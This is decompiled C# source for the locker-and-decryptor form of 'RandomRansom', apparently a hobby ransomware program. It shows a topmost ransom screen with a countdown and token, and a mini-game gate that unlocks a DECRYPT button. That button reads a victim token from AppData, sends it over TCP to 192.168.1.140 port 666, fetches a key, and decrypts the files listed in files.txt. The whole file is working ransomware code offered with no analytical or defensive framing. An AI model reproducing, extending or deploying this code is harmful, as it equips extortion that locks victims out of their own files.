using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RandomRansom.Properties;

namespace RandomRansom;

public class RANDOM_RANSOM : Form
{
	private Form1 game;

	private static Crypt c;

	private IContainer components = null;

	private PictureBox pictureBox1;

	private RichTextBox richTextBox1;

	private Label label1;

	private Label label2;

	private Button button1;

	private Button button2;

	private Label label3;

	private Label label4;

	public void init()
	{
		Control.set_CheckForIllegalCrossThreadCalls(false);
		game = new Form1();
		game.init();
		InitializeComponent();
		Thread thread = new Thread(loop);
		thread.Start();
	}

	private void loop()
	{
		for (long num = 0L; num < long.MaxValue; num++)
		{
			if (game.score >= 5)
			{
				((Control)button2).set_Enabled(true);
				((Control)this).Update();
				((Control)this).Invalidate();
				((Control)game).Hide();
			}
			else
			{
				Thread.Sleep(100);
			}
		}
	}

	private void RANDOM_RANSOM_Load(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		Thread thread = new Thread(StartGame);
		thread.Start();
	}

	private void StartGame()
	{
		Application.Run((Form)(object)game);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0262: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Thread.Sleep(2000);
			NetworkStream networkStream = null;
			bool flag = false;
			string text = "";
			string text2 = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\Appdata\\token.txt");
			try
			{
				if (CheckForInternetConnection())
				{
					TcpClient tcpClient = new TcpClient("192.168.1.140", 666);
					networkStream = tcpClient.GetStream();
					networkStream.Write(Encoding.ASCII.GetBytes(text2), 0, Encoding.ASCII.GetBytes(text2).Length);
					flag = true;
					Console.WriteLine("Connected to server with token_id: " + text2);
				}
			}
			catch (Exception)
			{
				Console.WriteLine("Failed to contact server! Using default token and key...");
				flag = false;
			}
			bool flag2 = true;
			try
			{
				if (flag)
				{
					Console.WriteLine("Getting key from server with token...");
					byte[] array = new byte[512];
					int count = networkStream.Read(array, 0, array.Length);
					text = Encoding.ASCII.GetString(array, 0, count);
				}
			}
			catch (Exception)
			{
				Console.WriteLine("Failed to Request key from server!");
				flag2 = false;
			}
			if (!flag2)
			{
				return;
			}
			Console.WriteLine("Got KEY! " + text);
			File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Appdata\\KEY.txt", text);
			Console.WriteLine("Creating crypt class...");
			c = new Crypt();
			Console.WriteLine("Getting all encrypted files...");
			string[] array2 = File.ReadAllLines("C:\\Users\\" + Environment.UserName + "\\Appdata\\files.txt");
			Console.WriteLine("Decrypting files...");
			for (int i = 0; i < array2.Length; i++)
			{
				try
				{
					if (array2[i] != null)
					{
						string input = "";
						using (StreamReader streamReader = new StreamReader(array2[i]))
						{
							input = streamReader.ReadToEnd();
							streamReader.Close();
						}
						string contents = c.DecryptText(input, text);
						int length = array2[i].LastIndexOf(".");
						string path = array2[i].Substring(0, length);
						File.WriteAllText(path, contents);
						File.Delete(array2[i]);
					}
				}
				catch (Exception ex3)
				{
					Console.WriteLine("");
					Console.WriteLine("");
					Console.WriteLine(ex3.ToString());
				}
			}
			Console.WriteLine("Deleting old files...");
			try
			{
				for (int j = 0; j < array2.Length; j++)
				{
					try
					{
						if (array2[j] != null)
						{
							try
							{
								File.Delete(array2[j]);
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
			MessageBox.Show("You're files are decrypted!", "RANDOM_RANSOM_DECRYPTOR", (MessageBoxButtons)0, (MessageBoxIcon)64);
			MessageBox.Show("Now we are gonna close RANDOM_RANSOM_DECRYPTOR so you're pc might bluescreen!", "RANDOM_RANSOM_DECRYPTOR", (MessageBoxButtons)0, (MessageBoxIcon)64);
			Environment.Exit(42069);
		}
		catch (Exception)
		{
		}
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://google.com/generate_204"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(RANDOM_RANSOM));
		richTextBox1 = new RichTextBox();
		label1 = new Label();
		label2 = new Label();
		button1 = new Button();
		button2 = new Button();
		label3 = new Label();
		label4 = new Label();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_Location(new Point(361, 12));
		((Control)richTextBox1).set_Name("richTextBox1");
		((TextBoxBase)richTextBox1).set_ReadOnly(true);
		((Control)richTextBox1).set_Size(new Size(587, 521));
		((Control)richTextBox1).set_TabIndex(1);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		richTextBox1.set_ZoomFactor(2.3f);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(12, 303));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(171, 33));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("TIME LEFT:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(12, 345));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(183, 33));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("0H 0M 0SEC");
		((Control)button1).set_BackColor(Color.LightGray);
		((Control)button1).set_Location(new Point(667, 539));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(281, 109));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("PLAY GAME");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)button2).set_BackColor(Color.LightGray);
		((Control)button2).set_Enabled(false);
		((Control)button2).set_Location(new Point(361, 539));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(281, 109));
		((Control)button2).set_TabIndex(5);
		((Control)button2).set_Text("DECRYPT");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(9, 635));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(47, 13));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text("TOKEN:");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(62, 635));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(44, 13));
		((Control)label4).set_TabIndex(7);
		((Control)label4).set_Text("TOKEN");
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)(object)Resources.Lock);
		((Control)pictureBox1).set_Location(new Point(12, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(176, 205));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(956, 656));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Control)this).set_Name("RANDOM_RANSOM");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("RANDOM_RANSOM_DECRYPTOR");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)RANDOM_RANSOM_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
